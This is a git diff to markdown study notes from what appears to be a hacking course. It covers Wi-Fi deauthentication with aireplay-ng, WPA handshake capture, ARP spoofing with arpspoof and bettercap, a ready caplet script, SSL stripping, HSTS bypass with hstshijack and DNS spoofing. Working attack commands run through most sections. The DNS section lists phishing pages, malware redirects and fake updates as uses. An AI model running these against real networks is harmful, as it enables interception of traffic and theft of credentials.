@@ -87,7 +87,7 @@
 - use:
 ```
   - aireplay-ng --deauth [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
-  - airodump-ng --deauth 10000000 -a FC:15:B4:00:00:00 -c FF:FF:FF:00:00:00 mon0
+  - aireplay-ng --deauth 10000000 -a FC:15:B4:00:00:00 -c FF:FF:FF:00:00:00 mon0
   - https://tools.kali.org/wireless-attacks/aireplay-ng
 ```
 - theory:
@@ -206,7 +206,7 @@ not.
   - STA Nonce
   - EAPOL
   - Payload
-- we matches our generated our MIC with retrieved MIC
+- we matches our generated MIC with retrieved MIC
 - MIC is used by access point to verifiy if password is correct or not
 - **Capturing the WPA / WPA2 handshape**
 ```
@@ -306,7 +306,9 @@ any request/response to access point goes through hacker computer, can be achiev
   arpspoof -i [interface] -t [gatewayIP] [clientIP]
   ## requests from MITM will not go to access point, it doesn't allow due to security feature,
   port forwarding needed to do so:
-  $ echo 1> /proc/sys/net/ip_forward
+  $ echo 1> /proc/sys/net/ipv4/ip_forward
+  ## open wireshark to see all network traffic flow through your interface
+  Note: wireshark used to monitor network traffic on its machine but as we are MITM and all traffic flows through us, we'd be able to see it
   ```
 
 ## ARP Spoofing (Using MITMf and Bettercap)
@@ -336,5 +338,110 @@ bettercap -iface [interface]
 - type **module_name on** to enable a module. ex: net.probe on
 - module -> net.recon : handles the response of net.probe UDP packets
 - type **net.show** get all the connected clients
+- module -> **arp.spoof** : for arp spoofing
+- type **caplets.show** : list all caplets
+- ARP spoofing:
+  - net.probe on
+  - set arp.spoof.fullduplex true   ( listen both side communicate from client and AP)
+  - set arp.target.spoof [TargetDeviceIP]
+  - apr.spoof on
+- capturing all data and analysing by Bettercap
+  - module -> net.sniff : anything flows through computer will be captured and analysed by this module
+  - net.sniff on
+- http://vulnweb.com : http sites for testingf
 
-## ARP Spoofing (Using Bettercap) Detailed:
+## ARP Spoofing (Create script - caplet):
+- caplet : text file that contains all the commands
+write all the command to a file and save as file_name.cap:
+```
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.target 192.168.0.4
+arp.spoof on
+set net.sniff.local true      
+net.sniff on
+```
+- net.sniff.local : sniff all data even if its local data (in https bettercap will thinks that data is of its been sent from our own computer)
+- bettercap -iface wlan0 -caplet file_name.cap
+
+## HTTPS and bypass by bettercap
+Problem:
+- Data in HTTP is sent as plain text.
+- A MITM can read and edit requests and responses. → not secure
+Solution:
+- Use HTTPS.
+- HTTPS is an adaptation of HTTP.
+- Encrypt HTTP using TLS (Transport Layer Security) or SSL (Secure Sockets Layer).
+
+**Bypass HTTPS:** <br>
+- Problem: Most websites use HTTPS → Sniffed data will be encrypted.
+- Solution: Downgrade HTTPS to HTTP.
+- bettercap provide the caplet to downgrade HTTPS to HTTP
+- it has a bug (correct version added on github in same repository as hstshijack.zip)
+- extract it in directory /usr/share/bettercap/caplets/ (delete existing one there)
+
+**Downgrade HTTPS to HTTP.** (SSL Stripping) <br>
+```
+- bettercap -iface wlan0 -caplet start_spoof.cap    ---------> (start_spoof.cap if caplet we created above to start sniffing)
+- type name of caplet to run ----> hstshijack/hstshijack
+```
+
+**HSTS** <br>
+Modern web browsers comes with a list of websites that they should only load over https like facebook, twitter etc
+- browser's doing this check locally, nothing can be done by MITM
+**ByPass HSTS** <br>
+- Trick the browser into loading a different website
+- replace all links for HSTS websites with similar links
+  - Ex: facebook.com -> facebook.corn
+- using hsts caplet to bypass it added in repository -> hstshijack.cap
+  ```
+  set hstshijack.targets              -> hsts websites
+  set hstshijack.replacement          -> replacements for target websites
+  set hstshijack.Payload              -> js file for code injection
+  ```
+- running the attack:
+```
+bettercap -iface wlan0 -caplet start_spoof.cap
+hstshijack/hstshijack
+```
+- if doesn't work, means site is cached, try after removing browsing Data
+- will not work url is directly entered in the search bar, user needs to search the target website on search engine (let's say google.in) and then click on the link from search result to work the hsts bypassing
+- script will work in background and replace all link to target website in search result
+- Link to onw issue: HSTS Hijack caplet dial tcp error
+  - https://www.youtube.com/watch?v=XoUPHF-wyMc&feature=youtu.be
+- bettercap V2.23:
+  - https://ufile.io/joxjzflg
+  - alternate added in repository
+
+## DNS Spoofing (Controlling DNS Requests on the Network)
+- DNS → Domain Name System.
+  - Translates domain names to IP addresses.
+  - request for website goes to DNS, will in result return the IP of the server
+  - Eg: links www.google.com to the IP of Google’s server. bing.com -> 204.79.197.200 etc
+- when we're MITM, request first comes to us before going to DNS server.
+- we give any other website in result to user's request
+- works against all http and https website
+- doesn't work against hsts websites
+
+**Redirecting to Local web server for a DNS request**
+```
+## start local webserver (kali linux comes with default)
+$ service apache2 start
+## if goes to ip of linux machine, it will redirect to default page of local server
+## page is stored at location -> /var/www/html/index.html
+## replace the file to show the page for a request
+$ bettercap -iface wlan0 -caplet start_spoof.cap
+## inside bettercap terminal -> help dns.spoof
+## dns.spoof.address -> redirect to this website on DNS request , default local address
+$ set dns.spoof.all true
+## dns.spoof.domains -> comma seperate list of domains to target
+$ set dns.spoof.domains google.com,*.google.com
+$ dns.spoof on
+```
+- use:
+  - replace login page with fake page
+  - redirect to another website with malware
+  - server fake updates (check if user has new updates, we can DNS spoof them send them fake updates)
+
+
+## Injecting Javascript code
